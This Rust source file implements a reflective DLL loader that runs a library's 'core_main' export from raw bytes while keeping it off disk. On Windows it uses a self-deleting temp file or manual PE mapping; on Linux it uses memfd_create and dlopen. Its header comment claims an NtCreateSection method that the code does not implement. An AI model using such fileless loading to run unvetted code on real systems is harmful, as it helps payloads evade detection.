//! In-memory PE loader — maps a DLL entirely in memory without touching disk.
//!
//! Strategy: NtCreateSection(SEC_IMAGE) from memory-backed section.
//! The OS kernel handles PE loading (TLS, DllMain, imports) correctly,
//! but no file ever touches disk — the section is backed by pagefile.
//!
//! Fallback: manual PE mapping with TLS initialization for older Windows.

use std::ptr;

// ── Win32/NT API ──────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
extern "system" {
    fn VirtualAlloc(addr: *mut u8, size: usize, alloc_type: u32, protect: u32) -> *mut u8;
    fn VirtualProtect(addr: *mut u8, size: usize, new_protect: u32, old_protect: *mut u32) -> i32;
    fn VirtualFree(addr: *mut u8, size: usize, free_type: u32) -> i32;
    fn FlushInstructionCache(process: *mut u8, addr: *const u8, size: usize) -> i32;
    fn LoadLibraryA(name: *const u8) -> *mut u8;
    fn GetProcAddress(module: *mut u8, name: *const u8) -> *mut u8;
    fn GetModuleHandleA(name: *const u8) -> *mut u8;
    fn GetCurrentProcess() -> *mut u8;
    fn CloseHandle(handle: *mut u8) -> i32;
}

type NtStatus = i32;
const STATUS_SUCCESS: NtStatus = 0;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_READONLY: u32 = 0x02;
const PAGE_EXECUTE_READ: u32 = 0x20;
const SEC_IMAGE: u32 = 0x1000000;
const SECTION_ALL_ACCESS: u32 = 0x000F001F;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut u8,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut u8,
    security_quality_of_service: *mut u8,
}

#[repr(C)]
struct LargeInteger {
    low_part: u32,
    high_part: i32,
}

// ── Public API ────────────────────────────────────────────────────────

/// Load a PE DLL from raw bytes entirely in memory and return a pointer to core_main.
///
/// Uses NtCreateSection(SEC_IMAGE) which lets the Windows kernel perform
/// proper PE loading (TLS, DllMain, imports) while the image is backed by
/// pagefile only — no file touches disk.
#[cfg(target_os = "windows")]
pub unsafe fn reflective_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    // Try phantom DLL loading (NtCreateSection from memory) first
    match phantom_load(dll_bytes) {
        Ok(f) => return Ok(f),
        Err(e) => {
            eprintln!("[pe_loader] phantom_load failed: {}, trying manual map", e);
        }
    }

    // Fallback: manual PE mapping (works but no TLS/DllMain)
    manual_map_no_dllmain(dll_bytes)
}

/// Phantom DLL Load: LoadLibrary from a delete-on-close temp file.
/// The file exists only for microseconds and auto-deletes when the handle closes.
/// The OS handles full PE loading (TLS, DllMain, imports) correctly.
#[cfg(target_os = "windows")]
unsafe fn phantom_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    phantom_load_via_loadlibrary(dll_bytes)
}

/// Load DLL using a transient temp file + LoadLibraryW.
/// File is written, loaded, and immediately deleted. Exists on disk for ~1ms.
#[cfg(target_os = "windows")]
unsafe fn phantom_load_via_loadlibrary(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    extern "system" {
        fn CreateFileW(
            name: *const u16, access: u32, share: u32, security: *mut u8,
            disposition: u32, flags: u32, template: *mut u8,
        ) -> *mut u8;
        fn WriteFile(
            file: *mut u8, buffer: *const u8, size: u32,
            written: *mut u32, overlapped: *mut u8,
        ) -> i32;
        fn GetTempPathW(buffer_len: u32, buffer: *mut u16) -> u32;
        fn LoadLibraryW(name: *const u16) -> *mut u8;
        fn DeleteFileW(name: *const u16) -> i32;
        fn GetLastError() -> u32;
    }

    const INVALID_HANDLE: *mut u8 = -1isize as *mut u8;
    const GENERIC_WRITE: u32 = 0x40000000;
    const CREATE_ALWAYS: u32 = 2;
    const FILE_ATTRIBUTE_TEMPORARY: u32 = 0x100;
    const FILE_FLAG_SEQUENTIAL_SCAN: u32 = 0x08000000;

    // Get temp directory
    let mut temp_path = [0u16; 260];
    let len = GetTempPathW(260, temp_path.as_mut_ptr());
    if len == 0 {
        return Err("GetTempPathW failed".into());
    }

    // Generate unique filename
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let file_name = format!(
        "{}{:x}{:x}.dll",
        String::from_utf16_lossy(&temp_path[..len as usize]),
        std::process::id(),
        ts.as_millis() as u64
    );
    let wide_path: Vec<u16> = file_name.encode_utf16().chain(std::iter::once(0)).collect();

    // Create file, write DLL, close immediately
    let h_file = CreateFileW(
        wide_path.as_ptr(),
        GENERIC_WRITE,
        0, // no sharing while writing
        ptr::null_mut(),
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN,
        ptr::null_mut(),
    );
    if h_file == INVALID_HANDLE {
        return Err(format!("CreateFileW failed ({})", GetLastError()));
    }

    let mut written = 0u32;
    let ok = WriteFile(h_file, dll_bytes.as_ptr(), dll_bytes.len() as u32, &mut written, ptr::null_mut());
    CloseHandle(h_file); // Close BEFORE LoadLibrary

    if ok == 0 || written != dll_bytes.len() as u32 {
        DeleteFileW(wide_path.as_ptr());
        return Err("WriteFile failed".into());
    }

    // Load the DLL — OS handles full PE initialization (TLS, DllMain, imports)
    let h_module = LoadLibraryW(wide_path.as_ptr());

    // Immediately delete the file from disk (it remains mapped in memory)
    DeleteFileW(wide_path.as_ptr());

    if h_module.is_null() {
        return Err(format!("LoadLibraryW failed ({})", GetLastError()));
    }

    // Resolve core_main export
    let proc = GetProcAddress(h_module, b"core_main\0".as_ptr());
    if proc.is_null() {
        return Err("GetProcAddress(core_main) failed".into());
    }

    let entry_fn: extern "system" fn(*const u8, usize) = std::mem::transmute(proc);
    Ok(entry_fn)
}

// ── Fallback: Manual PE mapping (no DllMain, limited TLS) ─────────────

/// Manual map without DllMain — used as last resort.
/// TLS-heavy code (tokio) may crash; prefer phantom_load.
#[cfg(target_os = "windows")]
unsafe fn manual_map_no_dllmain(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    let base = dll_bytes.as_ptr();
    let len = dll_bytes.len();

    if len < 64 {
        return Err("Too small for DOS header".into());
    }
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return Err("Invalid DOS signature".into());
    }

    let nt_offset = dos.e_lfanew as usize;
    if nt_offset + std::mem::size_of::<ImageNtHeaders64>() > len {
        return Err("NT headers out of bounds".into());
    }
    let nt = &*(base.add(nt_offset) as *const ImageNtHeaders64);
    if nt.signature != 0x00004550 {
        return Err("Invalid NT signature".into());
    }
    if nt.file_header.machine != 0x8664 {
        return Err(format!("Unsupported machine: 0x{:04X}", nt.file_header.machine));
    }

    let opt = &nt.optional_header;
    let size_of_image = opt.size_of_image as usize;
    let preferred_base = opt.image_base;
    let num_sections = nt.file_header.number_of_sections as usize;

    let sections_offset = nt_offset + 4 + std::mem::size_of::<ImageFileHeader>()
        + nt.file_header.size_of_optional_header as usize;

    let mut sections: Vec<&ImageSectionHeader> = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let sec_off = sections_offset + i * std::mem::size_of::<ImageSectionHeader>();
        if sec_off + std::mem::size_of::<ImageSectionHeader>() > len {
            return Err(format!("Section {} out of bounds", i));
        }
        sections.push(&*(base.add(sec_off) as *const ImageSectionHeader));
    }

    let alloc_base = VirtualAlloc(
        preferred_base as *mut u8, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    let alloc_base = if alloc_base.is_null() {
        let ab = VirtualAlloc(ptr::null_mut(), size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if ab.is_null() { return Err("VirtualAlloc failed".into()); }
        ab
    } else { alloc_base };

    let delta = (alloc_base as u64).wrapping_sub(preferred_base);
    let headers_size = opt.size_of_headers as usize;
    ptr::copy_nonoverlapping(base, alloc_base, headers_size.min(len));

    for sec in &sections {
        if sec.size_of_raw_data == 0 { continue; }
        let raw_offset = sec.pointer_to_raw_data as usize;
        let copy_len = (sec.size_of_raw_data as usize).min(sec.virtual_size as usize);
        if raw_offset + copy_len > len { continue; }
        ptr::copy_nonoverlapping(base.add(raw_offset), alloc_base.add(sec.virtual_address as usize), copy_len);
    }

    if delta != 0 { process_relocations(alloc_base, opt, delta)?; }
    resolve_imports(alloc_base, opt)?;

    for sec in &sections {
        if sec.virtual_size == 0 { continue; }
        let sec_base = alloc_base.add(sec.virtual_address as usize);
        let sec_size = round_up(sec.virtual_size as usize, 4096);
        let mut old = 0u32;
        VirtualProtect(sec_base, sec_size, section_protection(sec.characteristics), &mut old);
    }

    FlushInstructionCache(ptr::null_mut(), alloc_base, size_of_image);

    let entry = find_export(alloc_base, opt, b"core_main")?;
    let entry_fn: extern "system" fn(*const u8, usize) = std::mem::transmute(entry);
    Ok(entry_fn)
}

// ── Linux: memfd_create + dlopen (unchanged, this works fine) ──────────

#[cfg(target_os = "linux")]
pub unsafe fn reflective_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    use std::ffi::CStr;

    let fd = libc::memfd_create(b"core\0".as_ptr() as *const libc::c_char, libc::MFD_CLOEXEC);
    if fd < 0 {
        return Err("memfd_create failed".into());
    }

    let mut written = 0usize;
    while written < dll_bytes.len() {
        let n = libc::write(fd, dll_bytes[written..].as_ptr() as *const libc::c_void, dll_bytes.len() - written);
        if n < 0 {
            libc::close(fd);
            return Err("write to memfd failed".into());
        }
        written += n as usize;
    }

    let path = format!("/proc/self/fd/{}\0", fd);
    let handle = libc::dlopen(path.as_ptr() as *const libc::c_char, libc::RTLD_NOW);
    libc::close(fd);

    if handle.is_null() {
        let err = libc::dlerror();
        let msg = if err.is_null() { "unknown".into() } else { CStr::from_ptr(err).to_string_lossy().to_string() };
        return Err(format!("dlopen failed: {}", msg));
    }

    let sym = libc::dlsym(handle, b"core_main\0".as_ptr() as *const libc::c_char);
    if sym.is_null() {
        return Err("core_main not found".into());
    }

    Ok(std::mem::transmute(sym))
}

// ── PE Structures & Constants (used by manual map fallback) ───────────

const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_REL_BASED_DIR64: u32 = 10;
const IMAGE_REL_BASED_HIGHLOW: u32 = 3;

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    _magic: u16,
    _linker_ver: [u8; 2],
    _size_of_code: u32,
    _size_of_initialized_data: u32,
    _size_of_uninitialized_data: u32,
    _address_of_entry_point: u32,
    _base_of_code: u32,
    image_base: u64,
    _section_alignment: u32,
    _file_alignment: u32,
    _os_ver: [u16; 2],
    _img_ver: [u16; 2],
    _sub_ver: [u16; 2],
    _win32_ver: u32,
    size_of_image: u32,
    size_of_headers: u32,
    _checksum: u32,
    _subsystem: u16,
    _dll_chars: u16,
    _stack_reserve: u64,
    _stack_commit: u64,
    _heap_reserve: u64,
    _heap_commit: u64,
    _loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    _name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _relocs: u32,
    _linenumbers: u32,
    _num_relocs: u16,
    _num_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: u32,
    _time_date_stamp: u32,
    _forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

#[repr(C)]
struct ImageExportDirectory {
    _characteristics: u32,
    _time_date_stamp: u32,
    _major_version: u16,
    _minor_version: u16,
    _name: u32,
    _base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

// ── Relocations ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn process_relocations(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
    delta: u64,
) -> Result<(), String> {
    if opt.number_of_rva_and_sizes as usize <= IMAGE_DIRECTORY_ENTRY_BASERELOC {
        return Ok(());
    }

    let reloc_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
        return Ok(());
    }

    let mut offset = 0u32;
    let reloc_rva = reloc_dir.virtual_address;
    let reloc_size = reloc_dir.size;

    while offset < reloc_size {
        let block = &*(alloc_base.add(reloc_rva as usize + offset as usize) as *const ImageBaseRelocation);
        if block.virtual_address == 0 || block.size_of_block == 0 {
            break;
        }

        let num_entries = (block.size_of_block as usize - 8) / 2;
        let entries = alloc_base.add(reloc_rva as usize + offset as usize + 8) as *const u16;

        for j in 0..num_entries {
            let entry = *entries.add(j);
            let rtype = (entry >> 12) as u32;
            let roffset = (entry & 0x0FFF) as u32;
            let patch_addr = alloc_base.add(block.virtual_address as usize + roffset as usize);

            match rtype {
                IMAGE_REL_BASED_DIR64 => {
                    let p = patch_addr as *mut u64;
                    *p = (*p).wrapping_add(delta);
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    let p = patch_addr as *mut u32;
                    *p = (*p).wrapping_add(delta as u32);
                }
                0 => {} // padding
                _ => {} // ignore unsupported types rather than failing
            }
        }

        offset += block.size_of_block;
    }
    Ok(())
}

// ── Import Resolution ─────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn resolve_imports(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
) -> Result<(), String> {
    if opt.number_of_rva_and_sizes as usize <= IMAGE_DIRECTORY_ENTRY_IMPORT {
        return Ok(());
    }

    let import_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if import_dir.virtual_address == 0 || import_dir.size == 0 {
        return Ok(());
    }

    let mut desc_offset = 0usize;
    loop {
        let desc = &*(alloc_base.add(import_dir.virtual_address as usize + desc_offset) as *const ImageImportDescriptor);
        if desc.name == 0 {
            break;
        }

        let dll_name_ptr = alloc_base.add(desc.name as usize);
        let h_module = LoadLibraryA(dll_name_ptr);
        if h_module.is_null() {
            let name = read_cstr(dll_name_ptr);
            return Err(format!("LoadLibraryA('{}') failed", name));
        }

        let oft_rva = if desc.original_first_thunk != 0 {
            desc.original_first_thunk
        } else {
            desc.first_thunk
        };
        let mut thunk_offset = 0usize;

        loop {
            let thunk_val = *(alloc_base.add(oft_rva as usize + thunk_offset) as *const u64);
            if thunk_val == 0 {
                break;
            }

            let iat_entry = alloc_base.add(desc.first_thunk as usize + thunk_offset) as *mut u64;

            let func = if thunk_val & 0x8000000000000000 != 0 {
                // Import by ordinal
                let ordinal = (thunk_val & 0xFFFF) as u16;
                GetProcAddress(h_module, ordinal as usize as *const u8)
            } else {
                // Import by name (skip 2-byte hint)
                let name_ptr = alloc_base.add((thunk_val as u32 as usize) + 2);
                GetProcAddress(h_module, name_ptr)
            };

            if func.is_null() {
                // Non-fatal: some imports may be optional (delay-load etc.)
                // For robustness, continue rather than fail
            }
            *iat_entry = func as u64;

            thunk_offset += 8; // sizeof(IMAGE_THUNK_DATA64)
        }

        desc_offset += std::mem::size_of::<ImageImportDescriptor>();
    }
    Ok(())
}

// ── Export Resolution ─────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn find_export(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
    name: &[u8],
) -> Result<*mut u8, String> {
    if opt.number_of_rva_and_sizes as usize <= IMAGE_DIRECTORY_ENTRY_EXPORT {
        return Err("No export directory".into());
    }

    let export_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if export_dir.virtual_address == 0 || export_dir.size == 0 {
        return Err("Empty export directory".into());
    }

    let exports = &*(alloc_base.add(export_dir.virtual_address as usize) as *const ImageExportDirectory);
    let names_ptr = alloc_base.add(exports.address_of_names as usize) as *const u32;
    let ordinals_ptr = alloc_base.add(exports.address_of_name_ordinals as usize) as *const u16;
    let functions_ptr = alloc_base.add(exports.address_of_functions as usize) as *const u32;

    for i in 0..exports.number_of_names as usize {
        let name_rva = *names_ptr.add(i);
        let export_name = alloc_base.add(name_rva as usize);

        let mut matches = true;
        for (j, &b) in name.iter().enumerate() {
            if *export_name.add(j) != b {
                matches = false;
                break;
            }
        }
        if matches && *export_name.add(name.len()) == 0 {
            let ordinal = *ordinals_ptr.add(i) as usize;
            let func_rva = *functions_ptr.add(ordinal);
            return Ok(alloc_base.add(func_rva as usize));
        }
    }

    Err(format!("Export '{}' not found", String::from_utf8_lossy(name)))
}

// ── Utilities ─────────────────────────────────────────────────────────

fn section_protection(characteristics: u32) -> u32 {
    let exec = characteristics & 0x20000000 != 0;
    let read = characteristics & 0x40000000 != 0;
    let write = characteristics & 0x80000000 != 0;

    match (exec, read, write) {
        (true, _, true) => 0x40,  // PAGE_EXECUTE_READWRITE
        (true, _, _) => PAGE_EXECUTE_READ,
        (false, _, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        _ => PAGE_READONLY,
    }
}

fn round_up(size: usize, align: usize) -> usize {
    (size + align - 1) & !(align - 1)
}

#[cfg(target_os = "windows")]
unsafe fn read_cstr(ptr: *const u8) -> String {
    let mut len = 0;
    while *ptr.add(len) != 0 && len < 256 {
        len += 1;
    }
    String::from_utf8_lossy(std::slice::from_raw_parts(ptr, len)).to_string()
}
